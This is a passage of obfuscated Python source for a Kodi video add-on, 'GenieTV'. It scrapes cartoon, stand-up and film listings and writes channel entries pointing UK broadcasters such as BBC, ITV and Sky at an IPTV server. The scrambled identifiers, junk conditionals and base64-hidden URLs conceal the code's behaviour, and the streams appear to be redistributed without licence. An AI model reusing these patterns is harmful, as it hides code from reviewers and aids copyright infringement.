   pass
  elif 'Almost Naked' in i1I1I :
   pass
  elif 'Angry Kid' in i1I1I :
   pass
  elif 'Annoying Orange' in i1I1I :
   pass
  elif 'Aqua Teen' in i1I1I :
   pass
  elif 'Assy Mcgee' in i1I1I :
   pass
  elif 'Astroblast' in i1I1I :
   pass
  elif 'Atomic Betty' in i1I1I :
   pass
  elif 'Axe Cop' in i1I1I :
   pass
  elif 'Baby Playpen' in i1I1I :
   pass
  elif 'Beavis and Butt' in i1I1I :
   pass
  elif 'Celebrity Deathmatch' in i1I1I :
   pass
  elif 'Clerks The' in i1I1I :
   pass
  elif 'Crapston Villas' in i1I1I :
   pass
  elif 'Duckman:' in i1I1I :
   pass
  elif 'Stripperella' in i1I1I :
   pass
  elif 'Vixen' in i1I1I :
   pass
  else :
   O0Oo000ooO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , url , 10006 , ii11iIi1I + 'ORIGINCARTOON.png' , i1iiIII111ii , '' )
 xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 22 - 22: OoOoOO00 * Ooo00oOo00o * OOOO00ooo0Ooo + ii11ii1ii * OOooOOo
def oo0o0 ( url ) :
 OOOooo = iii ( url )
 IiiiiI1i1Iii = re . compile ( '<img src="(.+?)" id="series_image" width="250" height="370" alt=".+?" />' ) . findall ( OOOooo )
 for oO0O00oOOoooO in IiiiiI1i1Iii :
  oO0ooOoO = oO0O00oOOoooO
 ooO0000o00O = re . compile ( '<li><a href="(.+?)">Next</a></li>' ) . findall ( OOOooo )
 for url in ooO0000o00O :
  O0Oo000ooO00 ( '[COLORgreen]NEXT PAGE[/COLOR]' , url , 10006 , ii11iIi1I + 'Next.png' , i1iiIII111ii , '' )
 oOooOOOoOo = re . compile ( '&nbsp;<a href="(.+?)">(.+?)</a>' ) . findall ( OOOooo )
 for url , i1I1I in oOooOOOoOo :
  oo00OOoOoO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , url , 10007 , oO0ooOoO )
  if 91 - 91: OOOO00ooo0Ooo / O0 - OOooOooo . OOOo0
  if 82 - 82: i1i1i11IIi * Ii11I / ii
 xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 2 - 2: OOOo0 + OOooOOo . OOooOOo . O0 / OOOO00ooo0Ooo
def iIiiIiiIi ( url , IMAGE ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( '"playlist">(.+?)</span></div><div><iframe src="(.+?)"' ) . findall ( OOOooo )
 for i1I1I , url in oOooOOOoOo :
  print i1I1I + '     ' + url
  if 'easy' in url :
   i1iiIIIi ( url )
   if 62 - 62: O0 / OOOo0 % O0 * Ooo00oOo00o % OOOo0
   if 33 - 33: OOOo0 . ii * Ooo00oOo00o * iIii1I11I1II1
  xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
  if 5 - 5: Oo / i1i1i11IIi % O0 . o0OOOoO0 * i1i1i11IIi
def i1iiIIIi ( url ) :
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( "url: '(.+?)'," ) . findall ( OOOooo )
 for url in oOooOOOoOo :
  ooOooOoOoO ( url )
  if 73 - 73: Ii11I
  if 2 - 2: i11iIiiIii - OoOoOO00 / ii % O0
  if 66 - 66: Oo
def I1i1IiI1i ( ) :
 if 32 - 32: OoooooooOO - I1IiI - i11iIiiIii * OOooOOo / Oo + OoooooooOO
 O0Oo000ooO00 ( '[COLORgreen]Stand Up[/COLOR]' , '' , 10014 , ii11iIi1I + 'ORIGINSTANDUP.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Search Comedian[/COLOR]' , '' , 10015 , ii11iIi1I + 'ORIGINSTANDUP.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Others[/COLOR]' , '' , 10017 , ii11iIi1I + 'ORIGINSTANDUP.png' , i1iiIII111ii , '' )
 if 35 - 35: i1IIi - OOooOOo * O00oo0OO0oOOO
def O0oOoo0OoO0O ( ) :
 OO00O0O = iii ( ( i1111 ( 'aHR0cDovL2JhY2syYmFzaWNzYnVpbGQuY28udWsvdGVzdC9zdGFuZHVwbGlzdC5waHA=' ) ) )
 oOooOOOoOo = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( OO00O0O )
 for iI1i11 , oO0O00oOOoooO , i1I1I in oOooOOOoOo :
  if 'elete' in i1I1I :
   pass
  else :
   oo00OOoOoO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , iI1i11 , 222 , oO0O00oOOoooO )
   if 63 - 63: OoooooooOO / OO0O
def oooO00o0 ( ) :
 oOOoo00O00o = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 oooooo0O000o = oOOoo00O00o . lower ( )
 OO00O0O = iii ( ( i1111 ( 'aHR0cDovL3d3dy5jb3VjaHRyaXBwZXIuY29tL2ZvcnVtMi9wYWdlLnBocD9wYWdlPTM=' ) ) )
 o0o00oO0oo000 = re . compile ( '<tr>.+?<td width=".+?" align=".+?">.+?<img border=".+?" src="..(.+?)" width=".+?" height=".+?"></td>.+?<td width=".+?" valign=".+?" align=".+?"><font size=".+?">(.+?)</font></td>.+?<td width=".+?">(.+?)</td>' , re . DOTALL ) . findall ( OO00O0O )
 for oO0O00oOOoooO , oO000o , iIiiiI1IiI1I1 in o0o00oO0oo000 :
  for oOOoo00O00o in oO000o :
   print '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< img >>>>>>>>>>>>>>>>>>>>>>>>>>'
   o0Ooo0O0 = re . compile ( '<a href="(.+?)">(.+?)</a>' , re . DOTALL ) . findall ( iIiiiI1IiI1I1 )
   for iI1i11 , i1I1I in o0Ooo0O0 :
    if 'tube' in iI1i11 :
     pass
    elif 'stage' in iI1i11 :
     oo00OOoOoO00 ( '[COLORgreen]' + oO000o + '   -   ' + i1I1I + '[/COLOR]' , ( iI1i11 ) . replace ( '" target="_blank' , '' ) , 10016 , 'http://couchtripper.com/' + oO0O00oOOoooO , )
    elif 'vee' in iI1i11 :
     pass
     if 48 - 48: OOOO00ooo0Ooo - i1i1i11IIi + iIii1I11I1II1 + OoooooooOO
def Ii ( ) :
 OO00O0O = iii ( ( i1111 ( 'aHR0cDovL3d3dy5jb3VjaHRyaXBwZXIuY29tL2ZvcnVtMi9wYWdlLnBocD9wYWdlPTM=' ) ) )
 o0o00oO0oo000 = re . compile ( '<tr>.+?<td width=".+?" align=".+?">.+?<img border=".+?" src="..(.+?)" width=".+?" height=".+?"></td>.+?<td width=".+?" valign=".+?" align=".+?"><font size=".+?">(.+?)</font></td>.+?<td width=".+?">(.+?)</td>' , re . DOTALL ) . findall ( OO00O0O )
 for oO0O00oOOoooO , oO000o , iIiiiI1IiI1I1 in o0o00oO0oo000 :
  o0Ooo0O0 = re . compile ( '<a href="(.+?)">(.+?)</a>' , re . DOTALL ) . findall ( iIiiiI1IiI1I1 )
  for iI1i11 , i1I1I in o0Ooo0O0 :
   if 'tube' in iI1i11 :
    pass
   elif 'stage' in iI1i11 :
    oo00OOoOoO00 ( '[COLORgreen]' + oO000o + '   -   ' + i1I1I + '[/COLOR]' , ( iI1i11 ) . replace ( '" target="_blank' , '' ) , 10016 , 'http://couchtripper.com/' + oO0O00oOOoooO )
   elif 'vee' in iI1i11 :
    pass
    if 42 - 42: OOooOooo * o0OOOoO0 . i1i1i11IIi * OOOo0 + I1IiI
    if 25 - 25: OOOO00ooo0Ooo . OOOo0 + ii
 xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 75 - 75: i1i1i11IIi - OOooOOo % O00oo0OO0oOOO + i11iIiiIii
def O0OOOo ( url ) :
 OO00O0O = iii ( url )
 print '>>>>>>>>>>>>>>>>>>>>>>>>' + url + '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<'
 oo00oO0o = re . compile ( "url\[.+?\] = '(.+?)';" ) . findall ( OO00O0O )
 print '>>>>>>>>>>>>>>>>>>>>>>>' + ( str ( oo00oO0o ) ) + '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
 for url in oo00oO0o :
  ooOooOoOoO ( ( url ) . replace ( '[' , '' ) . replace ( ']' , '' ) . replace ( '\'' , '' ) )
  if 30 - 30: O00oo0OO0oOOO / Ooo00oOo00o + ii
  if 6 - 6: O00oo0OO0oOOO . OOOO00ooo0Ooo + OOooOooo . o0OOOoO0
  if 70 - 70: Ooo00oOo00o
  if 46 - 46: OOOO00ooo0Ooo - i1IIi
  if 46 - 46: o0OOOoO0 % OOooOooo
  if 72 - 72: iIii1I11I1II1
  if 45 - 45: Oo - OOooOOo % o0OOOoO0
def i1IIi1i1Ii1 ( ) :
 if 45 - 45: iIii1I11I1II1 . ii / I1IiI / i1i1i11IIi
 ooOOOoOoOOO0 ( '[COLOR darkgoldenrod]Open Pandora\'s Box[/COLOR]' , '' , 10029 , 'https://encrypted-tbn1.gstatic.com/images?q=tbn%3AANd9GcTQ9r4TA8yIw9ggxuwsHxWojo6tPVfgTe8QIOxOQwzNR2TavtCi6Q' , i1iiIII111ii , '' )
 ooOOOoOoOOO0 ( '[COLOR darkgoldenrod]Search[/COLOR]' , '' , 10026 , 'http://icons.iconarchive.com/icons/icontexto/search/256/search-red-dark-icon.png' , i1iiIII111ii , '' )
 if 5 - 5: Ii11I
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
 if 4 - 4: O00oo0OO0oOOO % o0OOOoO0 / Ooo00oOo00o . Ii11I / Ii11I - ii11ii1ii
def oO0ooOO ( ) :
 ooOOOoOoOOO0 ( 'Search Pandoras Films' , '' , 10027 , 'http://icons.iconarchive.com/icons/icontexto/search/256/search-red-dark-icon.png' , i1iiIII111ii , '' )
 ooOOOoOoOOO0 ( 'Search Pandoras TV' , '' , 10028 , 'http://icons.iconarchive.com/icons/icontexto/search/256/search-red-dark-icon.png' , i1iiIII111ii , '' )
 if 7 - 7: OoOoOO00 - Ii11I . OoOoOO00
 ooOoOO0oo0O ( 'movies' , 'MAIN' )
def OOo0O0O000 ( ) :
 if 29 - 29: OOooOOo / Oo * ii11ii1ii . OOooOOo
 oOOoo00O00o = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 oooooo0O000o = oOOoo00O00o . lower ( )
 oO00 = [ 'mova' , 'movb' , 'movc' , 'movd' , 'move' , 'movf' , 'movg' , 'movh' , 'movi' , 'movj' , 'movk' , 'movl' , 'movm' , 'movn' , 'movo' , 'movp' , 'movq' , 'movr' , 'movs' , 'movt' , 'movu' , 'movv' , 'movw' , 'movx' , 'movy' , 'movz' ]
 if 1 - 1: ii
 for I1IIIIiii1i in oO00 :
  o0IiiiI111I = ooooooO0oo + I1IIIIiii1i + II11iiii1Ii
  OO00O0O = iii ( o0IiiiI111I )
  oOooOOOoOo = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( OO00O0O )
  for iI1i11 , o0OOo0o0O0O , OOoooO00o0oo0 , o0OO0o0oOOO0O , i1I1I in oOooOOOoOo :
   if oOOoo00O00o in i1I1I . lower ( ) :
    III1I11i1iIi ( i1I1I , iI1i11 , 222 , o0OOo0o0O0O , o0OO0o0oOOO0O , OOoooO00o0oo0 )
    if 69 - 69: Oo * OoOoOO00 * OO0O . O00oo0OO0oOOO - ii11ii1ii
    ooOoOO0oo0O ( 'movies' , 'MAIN' )
    xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
    if 39 - 39: OOooOooo * OOOo0 % Ooo00oOo00o . I1IiI
    if 24 - 24: i1IIi * iIii1I11I1II1 / OOooOooo
def OoOOo00 ( ) :
 if 53 - 53: i1i1i11IIi . o0OOOoO0 % iIii1I11I1II1 % I1IiI % OOOO00ooo0Ooo
 oOOoo00O00o = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 oooooo0O000o = oOOoo00O00o . lower ( )
 oO00 = [ 'a' , 'b' , 'c' , 'd' , 'e' , 'f' , 'g' , 'h' , 'i' , 'j' , 'k' , 'l' , 'm' , 'n' , 'o' , 'p' , 'q' , 'r' , 's' , 't' , 'u' , 'v' , 'w' , 'x' , 'y' , 'z' ]
 if 53 - 53: o0OOOoO0
 for I1IIIIiii1i in oO00 :
  OOoOOo0o = ooooooO0oo + I1IIIIiii1i + II11iiii1Ii
  OO00O0O = iii ( OOoOOo0o )
  oOooOOOoOo = re . compile ( '<item>.+?<title>(.+?)</title>.+?<description>(.+?)</description>.+?<link>(.+?)</link>.+?<thumbnail>(.+?)</thumbnail>.+?<fanart>(.+?)</fanart>.+?<mode>(.+?)</mode>.+?</item>' , re . DOTALL ) . findall ( OO00O0O )
  for i1I1I , OOoooO00o0oo0 , iI1i11 , oO0O00oOOoooO , o0OO0o0oOOO0O , iIiii in oOooOOOoOo :
   if oOOoo00O00o in i1I1I . lower ( ) :
    ooOOOoOoOOO0 ( i1I1I , iI1i11 , iIiii , oO0O00oOOoooO , o0OO0o0oOOO0O , OOoooO00o0oo0 )
    if 2 - 2: i1IIi - OOOo0 + OOOO00ooo0Ooo . OoOoOO00
    ooOoOO0oo0O ( 'movies' , 'MAIN' )
    xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
    if 25 - 25: ii
    if 34 - 34: I1IiI . iIii1I11I1II1 % O0
def iI11Ii111 ( ) :
 if 54 - 54: I1IiI % O00oo0OO0oOOO . I1IiI * Ii11I + I1IiI % i1IIi
 OOOooo = iii ( ooooooO0oo + 'spongemain.php' )
 oOooOOOoOo = re . compile ( '<item>.+?<title>(.+?)</title>.+?<description>(.+?)</description>.+?<link>(.+?)</link>.+?<thumbnail>(.+?)</thumbnail>.+?<fanart>(.+?)</fanart>.+?<mode>(.+?)</mode>.+?</item>' , re . DOTALL ) . findall ( OOOooo )
 for i1I1I , OOoooO00o0oo0 , iI1i11 , oO0O00oOOoooO , o0OO0o0oOOO0O , iIiii in oOooOOOoOo :
  ooOOOoOoOOO0 ( i1I1I , iI1i11 , iIiii , oO0O00oOOoooO , o0OO0o0oOOO0O , OOoooO00o0oo0 )
  ooOoOO0oo0O ( 'movies' , 'MAIN' )
def I1I1I11Ii ( url ) :
 if 48 - 48: OoooooooOO + ii % iIii1I11I1II1
 xbmcplugin . addSortMethod ( handle = int ( sys . argv [ 1 ] ) , sortMethod = xbmcplugin . SORT_METHOD_TITLE )
 IiI1IIIII1I = ( '%s%s' % ( I1I1IiIi1 , url ) )
 Ii1IIiiIIi = iii ( url )
 oOooOOOoOo = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( Ii1IIiiIIi )
 for url , o0OOo0o0O0O , OOoooO00o0oo0 , oOO0o0oo0 , i1I1I in oOooOOOoOo :
  III1I11i1iIi ( i1I1I , url , 222 , o0OOo0o0O0O , oOO0o0oo0 , OOoooO00o0oo0 )
  if 78 - 78: Ii11I + O00oo0OO0oOOO . i1i1i11IIi
  ooOoOO0oo0O ( 'movies' , 'MAIN' )
  if 91 - 91: iIii1I11I1II1 . OOooOOo . ii11ii1ii + OoooooooOO
  xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
  if 69 - 69: o0OOOoO0 - OOOo0
  if 95 - 95: OOOo0 * i11iIiiIii . OO0O
def iIIi1 ( url ) :
 if 83 - 83: i1i1i11IIi * OOOO00ooo0Ooo / Oo
 OOOooo = iii ( url )
 oOooOOOoOo = re . compile ( '<item>.+?<title>(.+?)</title>.+?<description>(.+?)</description>.+?<link>(.+?)</link>.+?<thumbnail>(.+?)</thumbnail>.+?<fanart>(.+?)</fanart>.+?<mode>(.+?)</mode>.+?</item>' , re . DOTALL ) . findall ( OOOooo )
 for i1I1I , OOoooO00o0oo0 , url , oO0O00oOOoooO , o0OO0o0oOOO0O , iIiii in oOooOOOoOo :
  ooOOOoOoOOO0 ( i1I1I , url , iIiii , oO0O00oOOoooO , o0OO0o0oOOO0O , OOoooO00o0oo0 )
  if 32 - 32: OOooOOo + I1IiI - OoooooooOO
  ooOoOO0oo0O ( 'movies' , 'MAIN' )
  if 39 - 39: OoooooooOO * Ii11I * O0 . OOOO00ooo0Ooo . Ooo00oOo00o + OO0O
  if 9 - 9: I1IiI + ii % OoooooooOO + OOooOOo
 xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 56 - 56: OoooooooOO + ii11ii1ii - O00oo0OO0oOOO
def III1I11i1iIi ( name , url , mode , iconimage , fanart , description ) :
 if 24 - 24: OOooOOo + OO0O + OOOO00ooo0Ooo - iIii1I11I1II1
 I11Oo0oO00 = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&iconimage=" + urllib . quote_plus ( iconimage ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&description=" + urllib . quote_plus ( description )
 IiiI1III1I1 = True
 o0OoOoo00O = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 o0OoOoo00O . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 o0OoOoo00O . setProperty ( "Fanart_Image" , fanart )
 IiiI1III1I1 = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = I11Oo0oO00 , listitem = o0OoOoo00O , isFolder = False )
 return IiiI1III1I1
 if 29 - 29: OOooOOo
def ooOOOoOoOOO0 ( name , url , mode , iconimage , fanart , description ) :
 if 86 - 86: OoOoOO00 . i1i1i11IIi
 I11Oo0oO00 = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&iconimage=" + urllib . quote_plus ( iconimage ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&description=" + urllib . quote_plus ( description )
 IiiI1III1I1 = True
 o0OoOoo00O = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 o0OoOoo00O . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 o0OoOoo00O . setProperty ( "Fanart_Image" , fanart )
 IiiI1III1I1 = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = I11Oo0oO00 , listitem = o0OoOoo00O , isFolder = True )
 return IiiI1III1I1
if 2 - 2: OoooooooOO
if 60 - 60: Ooo00oOo00o
if 81 - 81: I1IiI % OOooOooo
if 87 - 87: iIii1I11I1II1 . OoooooooOO * I1IiI
if 100 - 100: Ooo00oOo00o / i1IIi - OOOo0 % OOooOooo - iIii1I11I1II1
if 17 - 17: OOOO00ooo0Ooo / OOooOOo % Oo
if 71 - 71: i1i1i11IIi . o0OOOoO0 . Ooo00oOo00o
if 68 - 68: i11iIiiIii % ii * Ooo00oOo00o * i1i1i11IIi * OoOoOO00 + O0
if 66 - 66: OOOO00ooo0Ooo % ii11ii1ii % OoooooooOO
if 34 - 34: OOooOOo / O00oo0OO0oOOO % O0 . Ooo00oOo00o . i1IIi
if 29 - 29: O0 . o0OOOoO0
if 66 - 66: ii * iIii1I11I1II1 % iIii1I11I1II1 * i1i1i11IIi - OO0O - i1i1i11IIi
if 70 - 70: o0OOOoO0 + ii
if 93 - 93: o0OOOoO0 + OOooOooo
if 33 - 33: O0
def oo0oO ( string ) :
 if OOO00 == 'true' :
  xbmc . log ( "[addon.live.GenieTV-%s]: %s" % ( addon_version , string ) )
  if 50 - 50: OoooooooOO - iIii1I11I1II1 + i1IIi % o0OOOoO0 - iIii1I11I1II1 % O0
def o0oO0Oo ( name , url , iconimage , fanart , mode , playlist = None , regexs = None ) :
 OO0OO000 = [ ]
 try :
  if 55 - 55: OO0O
  name = name . encode ( 'utf-8' , 'ignore' )
 except :
  pass
 if os . path . exists ( iIi1ii1I1 ) == False :
  oo0oO ( 'Making Favorites File' )
  OO0OO000 . append ( ( name , url , iconimage , fanart , mode , playlist , regexs ) )
  oOoooooOoO = open ( iIi1ii1I1 , "w" )
  oOoooooOoO . write ( json . dumps ( OO0OO000 ) )
  oOoooooOoO . close ( )
 else :
  oo0oO ( 'Appending Favorites' )
  oOoooooOoO = open ( iIi1ii1I1 ) . read ( )
  o0O0OO0o = json . loads ( oOoooooOoO )
  o0O0OO0o . append ( ( name , url , iconimage , fanart , mode ) )
  OOOooo0OooOoO = open ( iIi1ii1I1 , "w" )
  OOOooo0OooOoO . write ( json . dumps ( o0O0OO0o ) )
  OOOooo0OooOoO . close ( )
  if 54 - 54: I1IiI . ii % i11iIiiIii / OoooooooOO + i1i1i11IIi % ii
  if 36 - 36: ii
def o0OO ( ) :
 II1I1 = json . loads ( open ( iIi1ii1I1 ) . read ( ) )
 iii11I11iI1 = len ( II1I1 )
 for iI1i1iiii in II1I1 :
  i1I1I = iI1i1iiii [ 0 ]
  iI1i11 = iI1i1iiii [ 1 ]
  o0OOo0o0O0O = iI1i1iiii [ 2 ]
  try :
   oO0o = iI1i1iiii [ 3 ]
   if oO0o == None :
    raise
  except :
   if o0oO0 . getSetting ( 'use_thumb' ) == "true" :
    oO0o = o0OOo0o0O0O
   else :
    oO0o = o0OO0o0oOOO0O
  try : I1I1 = iI1i1iiii [ 5 ]
  except : I1I1 = None
  try : O0Oo0 = iI1i1iiii [ 6 ]
  except : O0Oo0 = None
  if 80 - 80: OOOo0 - iIii1I11I1II1 . Ii11I + Ooo00oOo00o - o0OOOoO0
  if iI1i1iiii [ 4 ] == 0 :
   O0Oo000ooO00 ( i1I1I , iI1i11 , '' , o0OOo0o0O0O , o0OO0o0oOOO0O , '' , 'fav' )
  else :
   O0Oo000ooO00 ( i1I1I , iI1i11 , iI1i1iiii [ 4 ] , o0OOo0o0O0O , o0OO0o0oOOO0O , '' , 'fav' )
   if 5 - 5: O00oo0OO0oOOO
def OO ( name ) :
 o0O0OO0o = json . loads ( open ( iIi1ii1I1 ) . read ( ) )
 for iI1 in range ( len ( o0O0OO0o ) ) :
  if o0O0OO0o [ iI1 ] [ 0 ] == name :
   del o0O0OO0o [ iI1 ]
   OOOooo0OooOoO = open ( iIi1ii1I1 , "w" )
   OOOooo0OooOoO . write ( json . dumps ( o0O0OO0o ) )
   OOOooo0OooOoO . close ( )
   break
 xbmc . executebuiltin ( "XBMC.Container.Refresh" )
 if 42 - 42: Ii11I % ii / Ooo00oOo00o - ii * i11iIiiIii
 if 19 - 19: ii * OOOo0 % i11iIiiIii
def Iiii1iI1i ( ) :
 iiI1Ii1I = os . path . join ( iIii1 , 'addons.ini' )
 i11Ii1iIiII = open ( iiI1Ii1I , "w+" )
 if 81 - 81: OOOO00ooo0Ooo . OoooooooOO * I1IiI % i1i1i11IIi . OOOO00ooo0Ooo
 i11Ii1iIiII . write ( r'# This file contains the "built-in" channels' + '\n' )
 i11Ii1iIiII . write ( r'# It is parsed by Pythons ConfigParser' + '\n\n' )
 i11Ii1iIiII . write ( r'[plugin.video.GenieTv]' + '\n' )
 i11Ii1iIiII . write ( r'BBC One=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F394.m3u8&mode=10012&name=[COLORgreen]BBC+One+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'BBC Two=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F190.m3u8&mode=10012&name=[COLORgreen]BBC+Two+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'BBC Four=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F188.m3u8&mode=10012&name=[COLORgreen]BBC+Four+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'BBC Ent MX=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F435.m3u8&mode=10012&name=[COLORgreen]BBC+Entertainment+MX%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'ITV=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F208.m3u8&mode=10012&name=[COLORgreen]ITV1+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'ITV2=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F207.m3u8&mode=10012&name=[COLORgreen]ITV2+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'ITV3=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F206.m3u8&mode=10012&name=[COLORgreen]ITV3+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'ITV4=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F205.m3u8&mode=10012&name=[COLORgreen]ITV4+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Channel 4=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F183.m3u8&mode=10012&name=[COLORgreen]Channel+4+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Channel 5=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F185.m3u8&mode=10012&name=[COLORgreen]Channel+5+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Sky1=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F32.m3u8&mode=10012&name=[COLORgreen]Sky+1+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Sky2=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F33.m3u8&mode=10012&name=[COLORgreen]Sky+2+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Sky Atlantic=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F34.m3u8&mode=10012&name=[COLORgreen]Sky+Atlantic+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Sky Living=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F35.m3u8&mode=10012&name=[COLORgreen]Sky+Living+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'5STAR=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F187.m3u8&mode=10012&name=[COLORgreen]5%2A+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'5 USA=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F186.m3u8&mode=10012&name=[COLORgreen]5USA+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Watch HD=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F408.m3u8&mode=10012&name=[COLORgreen]Watch+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Pick=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F410.m3u8&mode=10012&name=[COLORgreen]Pick+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'GOLD=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F430.m3u8&mode=10012&name=[COLORgreen]Gold+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'YESTERDAY=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F411.m3u8&mode=10012&name=[COLORgreen]Yesterday+UK%0D[/COLOR]' + '\n' )
